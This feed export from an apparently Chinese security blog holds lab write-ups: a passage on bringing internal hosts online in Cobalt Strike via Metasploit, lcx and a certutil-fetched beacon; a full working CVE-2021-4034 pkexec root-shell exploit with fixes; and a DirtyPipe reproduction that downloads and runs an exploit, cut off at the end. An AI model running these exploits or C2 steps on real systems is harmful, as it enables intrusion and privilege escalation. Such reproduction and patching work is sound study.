class="line"><span class="comment"># 设置攻击机监听端口</span></span><br><span class="line"><span class="built_in">set</span> lport 7777</span><br><span class="line"><span class="comment"># 允许回连</span></span><br><span class="line"><span class="built_in">set</span> ReverseAllowProxy <span class="literal">true</span></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">run -j -z</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204519.png" alt="image-20220421211613836"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204636.png" alt="image-20220421211458269"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212204847.png" alt="image-20220421211932556"></p><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><h4 id="10-10-5-100上线CS"><a href="#10-10-5-100上线CS" class="headerlink" title="10.10.5.100上线CS"></a>10.10.5.100上线CS</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动CS</span></span><br><span class="line">nohup ./teamserver 192.168.232.129 password &gt; /dev/null &amp; <span class="comment"># 后台开启服务端</span></span><br><span class="line">nohup ./cobaltstrike.sh &gt; /dev/null &amp; <span class="comment"># 后台开启客户端</span></span><br><span class="line"><span class="comment"># 将本地 5555 端口映射回二层内网</span></span><br><span class="line">lcx.exe -tran 5555 10.10.10.3 5555</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212203701.png" alt="image-20220421114735765"></p><p>添加</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212203119.png" alt="image-20220421114847768"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212203187.png" alt="image-20220421151423950"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212203194.png" alt="image-20220421151542407"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212203394.png" alt="image-20220421151629001"></p><p>上传至 10.10.10.5 服务器 无法上传就利用边界机下载</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用边界机下载</span></span><br><span class="line">certutil -urlcache -split -f http://10.10.10.3/beacon64.exe</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">beacon64.exe</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212203444.png" alt="image-20220421150047253"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202359.png" alt="image-20220421150151167"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202186.png" alt="image-20220421150305265"></p><h5 id="上线了"><a href="#上线了" class="headerlink" title="上线了"></a>上线了</h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202250.png" alt="image-20220421151327812"></p><p>提权</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202455.png" alt="image-20220421152012320"></p><h4 id="10-10-10-3上线CS"><a href="#10-10-10-3上线CS" class="headerlink" title="10.10.10.3上线CS"></a>10.10.10.3上线CS</h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202045.png" alt="image-20220421163718859"></p><p><img src="E:/img/image-20220421161638337.png" alt="image-20220421161638337"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202204.png" alt="image-20220421161709923"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212202641.png" alt="image-20220421161530096"></p><p>上传</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212201179.png" alt="image-20220421161917380"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加执行权限</span></span><br><span class="line">chmod +x *</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./CrossC2-test</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200001.png" alt="image-20220421162139600"></p><h5 id="上线了-1"><a href="#上线了-1" class="headerlink" title="上线了"></a>上线了</h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200730.png" alt="image-20220421162337087"></p><hr><h4 id="10-10-5-105上线CS"><a href="#10-10-5-105上线CS" class="headerlink" title="10.10.5.105上线CS"></a>10.10.5.105上线CS</h4><h5 id="中继"><a href="#中继" class="headerlink" title="中继"></a>中继</h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200984.png" alt="image-20220421213338115"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200904.png" alt="image-20220421213441187"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 10.10.5.105 的 sessions</span></span><br><span class="line">sessions 4</span><br><span class="line"><span class="comment"># 上传至 10.10.5.105 主机</span></span><br><span class="line">upload  /root/Desktop/5105.exe C:\\windows</span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 设置为 UTF-8 编码格式显示</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment"># 返回上一级目录, 因为文件被上传到 C:\\windows 目录下</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"><span class="comment"># 返回 meterpreter</span></span><br><span class="line">Ctrl + z<span class="comment"># y</span></span><br><span class="line"><span class="comment"># 执行后门文件</span></span><br><span class="line">execute -cH -f <span class="string">"5105.exe"</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200968.png" alt="image-20220421213847263"></p><h5 id="上线了-2"><a href="#上线了-2" class="headerlink" title="上线了"></a>上线了</h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200831.png" alt="image-20220421214003453"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204212200169.png" alt="image-20220421170025901"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 内网代理实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>收藏的网址</title>
      <link href="/2022/04/19/%E7%BD%91%E5%9D%80%E6%94%B6%E8%97%8F/"/>
      <url>/2022/04/19/%E7%BD%91%E5%9D%80%E6%94%B6%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="35501bcda93baa123d9e60a31dc7f210b64397bb8e6604797f9cdaa3eba9086c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 网址 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复</title>
      <link href="/2022/04/10/CVE-2021-4034%EF%BC%9ALinux%20Polkit%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D/"/>
      <url>/2022/04/10/CVE-2021-4034%EF%BC%9ALinux%20Polkit%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-4034：Linux-Polkit-权限提升漏洞复现及修复"><a href="#CVE-2021-4034：Linux-Polkit-权限提升漏洞复现及修复" class="headerlink" title="CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复"></a>CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>国外安全研究团队在 polkit 的 pkexec 中发现存在的本地权限提升漏洞（CVE-2021-4034）</p><p><strong>关于 Polkit pkexec for Linux</strong><br>Polkit (以前称为 PolicyKit) 是一个用于在类 Unix 操作系统中控制系统范围权限的组件. 它为非特权进程与特权进程通信提供了一种有组织的方式. 也可以使用 polkit 执行具有提升权限的命令, 使用命令 pkexec 后跟要执行的命令 (具有 root 权限) </p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><h4 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a><strong>受影响版本</strong></h4><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2009</span>年<span class="number">5</span>月至今发布的所有 Polkit 版本</span><br><span class="line">注：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。</span><br></pre></td></tr></tbody></table></figure><h4 id="不受影响版本"><a href="#不受影响版本" class="headerlink" title="不受影响版本"></a><strong>不受影响版本</strong></h4><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CentOS：</span><br><span class="line">· CentOS <span class="number">6</span>：polkit-<span class="number">0.96</span>-<span class="number">11.</span>el6_10<span class="number">.2</span></span><br><span class="line">· CentOS <span class="number">7</span>：polkit-<span class="number">0.112</span>-<span class="number">26.</span>el7_9<span class="number">.1</span></span><br><span class="line">· CentOS <span class="number">8.0</span>：polkit-<span class="number">0.115</span>-<span class="number">13.</span>el8_5<span class="number">.1</span></span><br><span class="line">· CentOS <span class="number">8.2</span>：polkit-<span class="number">0.115</span>-<span class="number">11.</span>el8_2<span class="number">.2</span></span><br><span class="line">· CentOS <span class="number">8.4</span>：polkit-<span class="number">0.115</span>-<span class="number">11.</span>el8_4<span class="number">.2</span></span><br><span class="line">Ubuntu：</span><br><span class="line">· Ubuntu <span class="number">14.04</span> ESM：policykit-<span class="number">1</span>-<span class="number">0.105</span>-4ubuntu3<span class="number">.14</span><span class="number">.04</span><span class="number">.6</span>+esm1</span><br><span class="line">· Ubuntu <span class="number">16.04</span> ESM：policykit-<span class="number">1</span>-<span class="number">0.105</span>-<span class="number">14.</span>1ubuntu0<span class="number">.5</span>+esm1</span><br><span class="line">· Ubuntu <span class="number">18.04</span> LTS：policykit-<span class="number">1</span>-<span class="number">0.105</span>-20ubuntu0<span class="number">.18</span><span class="number">.04</span><span class="number">.6</span></span><br><span class="line">· Ubuntu <span class="number">20.04</span> LTS：policykit-<span class="number">1</span>-<span class="number">0.105</span>-26ubuntu1<span class="number">.2</span></span><br><span class="line">· Ubuntu <span class="number">21.10</span>：policykit-<span class="number">1</span>-<span class="number">0.105</span>-31ubuntu0<span class="number">.1</span></span><br><span class="line">Debain：</span><br><span class="line">· ：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">18</span>+deb9u2</span><br><span class="line">· Debain stretch：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">18</span>+deb9u2</span><br><span class="line">· Debain buster：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">25</span>+deb10u1</span><br><span class="line">· Debain bullseye：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">31</span>+deb11u1</span><br><span class="line">· Debain bookworm,bullseye：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">31.1</span></span><br></pre></td></tr></tbody></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>​    1.) 攻击者需要一个本地用户权限<br>​    2.) 恶意文件需要可执行</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>**漏洞环境: **Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核版本</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="comment"># 查看pkexec版本</span></span><br><span class="line">pkexec --version</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092154291.png" alt="image-20220409215418994"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前id,为本地普通用户</span></span><br><span class="line">id</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092155953.png" alt="image-20220409215511497"></p><p>执行exp提权</p><p><a href="https://github.com/arthepsy/CVE-2021-4034">EXP链接</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 exp</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/arthepsy/CVE-2021-4034.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2021-4034-main</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc cve-2021-4034-poc.c -o exp</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./exp</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092211712.png" alt="image-20220409221129140"></p><h3 id="EXP文件内容"><a href="#EXP文件内容" class="headerlink" title="EXP文件内容"></a>EXP文件内容</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * blasty-vs-pkexec.c -- by blasty &lt;peter@haxx.in&gt; </span></span><br><span class="line"><span class="comment"> * ------------------------------------------------</span></span><br><span class="line"><span class="comment"> * PoC for CVE-2021-4034, shout out to Qualys</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ctf quality exploit</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * bla bla irresponsible disclosure</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- blasty // 2022-01-25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fatal</span><span class="params">(<span class="keyword">char</span> *f)</span> </span>{</span><br><span class="line">    perror(f);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_so</span><span class="params">()</span> </span>{</span><br><span class="line">    FILE *f = fopen(<span class="string">"payload.c"</span>, <span class="string">"wb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {</span><br><span class="line">        fatal(<span class="string">"fopen"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> so_code[]=</span><br><span class="line">        <span class="string">"#include &lt;stdio.h&gt;\n"</span></span><br><span class="line">        <span class="string">"#include &lt;stdlib.h&gt;\n"</span></span><br><span class="line">        <span class="string">"#include &lt;unistd.h&gt;\n"</span></span><br><span class="line">        <span class="string">"void gconv() {\n"</span></span><br><span class="line">        <span class="string">"  return;\n"</span></span><br><span class="line">        <span class="string">"}\n"</span></span><br><span class="line">        <span class="string">"void gconv_init() {\n"</span></span><br><span class="line">        <span class="string">"  setuid(0); seteuid(0); setgid(0); setegid(0);\n"</span></span><br><span class="line">        <span class="string">"  static char *a_argv[] = { \"sh\", NULL };\n"</span></span><br><span class="line">        <span class="string">"  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"</span></span><br><span class="line">        <span class="string">"  execve(\"/bin/sh\", a_argv, a_envp);\n"</span></span><br><span class="line">        <span class="string">"  exit(0);\n"</span></span><br><span class="line">        <span class="string">"}\n"</span>;</span><br><span class="line"></span><br><span class="line">    fwrite(so_code, <span class="built_in">strlen</span>(so_code), <span class="number">1</span>, f);</span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"gcc -o payload.so -shared -fPIC payload.c"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *a_argv[]={ <span class="literal">NULL</span> };</span><br><span class="line">    <span class="keyword">char</span> *a_envp[]={</span><br><span class="line">        <span class="string">"lol"</span>,</span><br><span class="line">        <span class="string">"PATH=GCONV_PATH=."</span>,</span><br><span class="line">        <span class="string">"LC_MESSAGES=en_US.UTF-8"</span>,</span><br><span class="line">        <span class="string">"XAUTHORITY=../LOL"</span>,</span><br><span class="line">        <span class="string">"GIO_USE_VFS="</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[~] compile helper..\n"</span>);</span><br><span class="line">    compile_so();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">"GCONV_PATH=."</span>, &amp;st) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">"GCONV_PATH=."</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">            fatal(<span class="string">"mkdir"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"GCONV_PATH=./lol"</span>, O_CREAT|O_RDWR, <span class="number">0777</span>); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">            fatal(<span class="string">"open"</span>);</span><br><span class="line">        }</span><br><span class="line">        close(fd);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">"lol"</span>, &amp;st) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">"lol"</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">            fatal(<span class="string">"mkdir"</span>);</span><br><span class="line">        }</span><br><span class="line">        FILE *fp = fopen(<span class="string">"lol/gconv-modules"</span>, <span class="string">"wb"</span>);</span><br><span class="line">        <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) {</span><br><span class="line">            fatal(<span class="string">"fopen"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">"module  UTF-8//    INTERNAL    ../payload    2\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[~] maybe get shell now?\n"</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">"/usr/bin/pkexec"</span>, a_argv, a_envp);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改文件权限</span></span><br><span class="line">chmod 0755 /usr/bin/pkexec</span><br></pre></td></tr></tbody></table></figure><p>系统检测（参考：深信服千里目安全实验室）</p><p>CentOS 用户可采用如下命令升级到安全版本或更高版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum update polkit -y</span><br></pre></td></tr></tbody></table></figure><p>验证修复，通过以下命令可查看 Polkit 是否为安全版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa polkit</span><br></pre></td></tr></tbody></table></figure><p>Ubuntu 用户可采用如下命令升级至安全版本或更高版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install policykit-1</span><br></pre></td></tr></tbody></table></figure><p>验证修复，通过以下命令可查看 Polkit 是否为安全版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l policykit-1</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现DirtyPipe CVE-2022-0847 Linux 内核提权</title>
      <link href="/2022/04/10/DirtyPipe%20CVE-2022-0847%20Linux%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"/>
      <url>/2022/04/10/DirtyPipe%20CVE-2022-0847%20Linux%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="DirtyPipe-CVE-2022-0847-Linux-内核提权"><a href="#DirtyPipe-CVE-2022-0847-Linux-内核提权" class="headerlink" title="DirtyPipe CVE-2022-0847 Linux 内核提权"></a>DirtyPipe CVE-2022-0847 Linux 内核提权</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>影响范围: Linux内核5.8及以后的版本<br>RT 通过 CVE-2022-0847 可覆盖重写任意可读文件中的数据，可将普通权限的用户提升到特权 root<br>CVE-2022-0847是Linux内核的本地提权漏洞, 原理类似于Dirty Cow linux提权. 目前该漏洞的EXP已经公开, 且处于在野利用.</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这里使用的是Kali系统, 先查看内核版本. </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 影响版本: Linux kernel&gt;=5.8</span></span><br><span class="line"><span class="comment"># 查看内核版本</span></span><br><span class="line">uname -a</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092045736.png" alt="image-20220409204512350"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载exp</span></span><br><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc dirtypipez.c -o dirtypipez</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092045042.png" alt="image-20220409204554683"></p><h3 id="1-通过覆盖SUID程序进行提权poc验证"><a href="#1-通过覆盖SUID程序进行提权poc验证" class="headerlink" title="1.) 通过覆盖SUID程序进行提权poc验证"></a>1.) 通过覆盖SUID程序进行提权poc验证</h3><p>SUID (Set User ID) 是文件的一种权限, 允许用户以其所有者的权限执行文件. Linux 二进制文件可以拥有这种类型的权限集有很多原因. 例如,: ping 实用程序需要 root 权限才能打开网络套接字, 但它也需要由标准用户执行, 以验证与其他主机的连接. </p><p>但是，如果某些现有的二进制文件和实用程序具有 SUID 权限, 则可以使用它们将权限提升到 root. </p><p>以下命令可以发现系统上运行的所有 SUID 可执行文件。更具体地说, 这些命令是尝试在用户 root 拥有的具有 SUID 权限位的目录中查找文件, 然后将所有其重定向到 /dev/null 以便仅列出用户有权访问的二进制文件使用权.<br><strong>参考：</strong><a href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a><br><a href="https://github.com/mzet-/linux-exploit-suggester">Linux提权审计工具</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找具有 root 权限的 SUID的文件</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 使用 /usr/bin/pkexec 进行提权</span></span><br><span class="line">./dirtypipez /usr/bin/pkexec</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092054796.png" alt="image-20220409205443929"><br><img 